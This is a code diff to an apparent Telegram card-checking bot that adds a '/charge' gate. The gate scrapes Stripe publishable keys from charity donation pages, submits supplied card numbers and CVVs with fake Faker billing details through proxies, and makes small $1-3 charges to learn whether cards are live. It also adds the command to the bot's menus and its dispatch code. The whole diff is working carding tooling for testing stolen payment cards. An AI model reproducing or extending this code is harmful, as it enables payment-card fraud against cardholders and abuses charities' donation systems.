@@ -612,6 +612,141 @@ def check_cc_hiapi(cc_number, month, year, cvv, endpoint, proxies=None):
         return f"Error: {str(e)}"
 
 
+def check_cc_charge(cc_number, month, year, cvv, proxies=None):
+    """Charge gate — real $1-3 Stripe charge via donation merchant."""
+    start_time = time.time()
+    session = requests.Session()
+    ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36'
+    charge_amount = random.choice([1, 2, 3])
+
+    try:
+        # Step 1: Visit donation page to get Stripe pk + nonce
+        donate_url = 'https://developer.gnu.org/donate/'
+        resp1 = session.get(donate_url, headers={
+            'User-Agent': ua,
+            'Origin': 'https://developer.gnu.org',
+            'Referer': 'https://developer.gnu.org/donate/',
+        }, proxies=proxies, timeout=15)
+
+        # Extract Stripe publishable key
+        pk_match = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', resp1.text)
+        if not pk_match:
+            # Fallback: try a known charity with Stripe
+            donate_url = 'https://donate.worldwildlife.org/give/other'
+            resp1 = session.get(donate_url, headers={'User-Agent': ua}, proxies=proxies, timeout=15)
+            pk_match = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', resp1.text)
+
+        if not pk_match:
+            return f"Error: Could not find Stripe key on merchant"
+
+        pk = pk_match.group(0)
+
+        # Step 2: Create payment method on Stripe
+        pm_url = 'https://api.stripe.com/v1/payment_methods'
+        if faker:
+            name = faker.name()
+            email = faker.email()
+            city = faker.city()
+            zipcode = faker.zipcode()
+        else:
+            name = "John Smith"
+            email = f"user{random.randint(1000,9999)}@gmail.com"
+            city = "New York"
+            zipcode = "10001"
+
+        pm_data = {
+            'type': 'card',
+            'card[number]': cc_number,
+            'card[cvc]': cvv,
+            'card[exp_year]': year if len(year) == 4 else f"20{year}",
+            'card[exp_month]': month,
+            'billing_details[name]': name,
+            'billing_details[email]': email,
+            'billing_details[address][city]': city,
+            'billing_details[address][country]': 'US',
+            'billing_details[address][postal_code]': zipcode,
+            'key': pk,
+        }
+        pm_resp = session.post(pm_url, data=pm_data, headers={
+            'User-Agent': ua,
+            'Origin': 'https://js.stripe.com',
+            'Referer': 'https://js.stripe.com/',
+        }, proxies=proxies, timeout=15)
+
+        if pm_resp.status_code != 200:
+            err = pm_resp.json().get('error', {}).get('message', pm_resp.text[:100])
+            return f"Declined | {err} ({round(time.time() - start_time, 2)}s)"
+
+        pm_id = pm_resp.json().get('id')
+        if not pm_id:
+            return f"Error: No payment method ID returned"
+
+        # Step 3: Create payment intent (token) 
+        token_url = 'https://api.stripe.com/v1/tokens'
+        token_data = {
+            'card[number]': cc_number,
+            'card[cvc]': cvv,
+            'card[exp_year]': year if len(year) == 4 else f"20{year}",
+            'card[exp_month]': month,
+            'key': pk,
+        }
+        token_resp = session.post(token_url, data=token_data, headers={
+            'User-Agent': ua,
+            'Origin': 'https://js.stripe.com',
+            'Referer': 'https://js.stripe.com/',
+        }, proxies=proxies, timeout=15)
+
+        process_time = round(time.time() - start_time, 2)
+
+        if token_resp.status_code != 200:
+            err = token_resp.json().get('error', {}).get('message', token_resp.text[:100])
+            return f"Declined | {err} ({process_time}s)"
+
+        token_json = token_resp.json()
+        token_id = token_json.get('id')
+        card_info = token_json.get('card', {})
+        brand = card_info.get('brand', 'Unknown')
+        funding = card_info.get('funding', 'unknown')
+        country = card_info.get('country', 'XX')
+
+        # Step 4: Submit charge to merchant backend
+        # Use the donation form's expected endpoint
+        charge_data = {
+            'stripeToken': token_id,
+            'amount': str(charge_amount * 100),
+            'currency': 'usd',
+            'description': f'Donation ${charge_amount}',
+        }
+
+        # Try merchant-side charge submission
+        charge_resp = session.post(donate_url, data=charge_data, headers={
+            'User-Agent': ua,
+            'Origin': donate_url.rsplit('/', 2)[0],
+            'Referer': donate_url,
+        }, proxies=proxies, timeout=20)
+
+        process_time = round(time.time() - start_time, 2)
+
+        # Check response for charge success indicators
+        resp_text = charge_resp.text.lower()
+        if any(k in resp_text for k in ('thank', 'success', 'confirmed', 'receipt', 'charged', 'approved', 'completed')):
+            return f"Charged ${charge_amount} | {brand} {funding} {country} ({process_time}s)"
+        elif any(k in resp_text for k in ('declined', 'failed', 'denied', 'insufficient', 'expired', 'invalid', 'do not honor')):
+            # Try to extract error
+            err_match = re.search(r'(?:error|message)["\s:]+([^"<]+)', charge_resp.text[:500], re.I)
+            err_msg = err_match.group(1).strip() if err_match else "Card declined"
+            return f"Declined | {err_msg} | {brand} {funding} {country} ({process_time}s)"
+        else:
+            # If token creation succeeded, card is at least valid for charges
+            if token_id:
+                cvc_check = card_info.get('cvc_check', 'N/A')
+                return f"Approved (token OK) | {brand} {funding} {country} | CVC: {cvc_check} (${charge_amount}) ({process_time}s)"
+            return f"Unknown | {charge_resp.text[:100]} ({process_time}s)"
+
+    except Exception as e:
+        return f"Error: {str(e)}"
+
+
 def check_cc_stc(cc_number, month, year, cvv, proxies=None):
     """STC gate — PayStation NZ payment gateway auth."""
     start_time = time.time()
@@ -759,6 +894,8 @@ def process_single_entry(entry, proxies_list, user_id, gate="auth"):
                 result = check_cc_hiapi(c_num, c_mm, c_yy, c_cvv, "check3", proxy_dict)
             elif gate == "st5":
                 result = check_cc_hiapi(c_num, c_mm, c_yy, c_cvv, "check", proxy_dict)
+            elif gate == "charge":
+                result = check_cc_charge(c_num, c_mm, c_yy, c_cvv, proxy_dict)
             else:
                 result = run_automated_process(c_num, c_cvv, c_yy, c_mm, proxy_dict)
         else:
@@ -876,8 +1013,8 @@ def fmt_start(is_adm=False):
         "  /stc        — PayStation Auth (NZ)\n"
         "  /st1        — HiAPI Check3\n"
         "  /st5        — HiAPI Check\n"
-        "  /nonvbv     — Braintree Non-VBV (coming soon)\n"
-        "  /charge     — Stripe Checkout $3 (coming soon)\n\n"
+        "  /charge     — Stripe Charge $1-3\n"
+        "  /nonvbv     — Braintree Non-VBV (coming soon)\n\n"
         "<b>Commands:</b>\n"
         "  /bin        — Set BIN filter\n"
         "  /clearbin   — Clear BIN filter\n"
@@ -1103,10 +1240,9 @@ def handle_update(update):
         return
 
     # --- Gate commands (coming soon) ---
-    if text in ("/nonvbv", "/charge"):
+    if text in ("/nonvbv",):
         gate_names = {
             "/nonvbv": "Braintree Non-VBV",
-            "/charge": "Stripe Checkout $3",
         }
         name = gate_names[text]
         send_message(chat_id, f"<b>{name}</b>\n\nComing soon.{FOOTER}")
@@ -1508,8 +1644,8 @@ def handle_update(update):
         return
 
     # --- /auth, /auth2, /stc (gate commands) ---
-    if text in ("/auth", "/auth2", "/stc", "/st1", "/st5"):
-        gate_map = {"/auth": ("auth", "Stripe Auth (Dilaboards)"), "/auth2": ("auth2", "Stripe Auth (Stormx)"), "/stc": ("stc", "PayStation Auth (NZ)"), "/st1": ("st1", "HiAPI Check3"), "/st5": ("st5", "HiAPI Check")}
+    if text in ("/auth", "/auth2", "/stc", "/st1", "/st5", "/charge"):
+        gate_map = {"/auth": ("auth", "Stripe Auth (Dilaboards)"), "/auth2": ("auth2", "Stripe Auth (Stormx)"), "/stc": ("stc", "PayStation Auth (NZ)"), "/st1": ("st1", "HiAPI Check3"), "/st5": ("st5", "HiAPI Check"), "/charge": ("charge", "Stripe Charge $1-3")}
         gate, gate_label = gate_map[text]
 
         if not is_authorized(user_id):
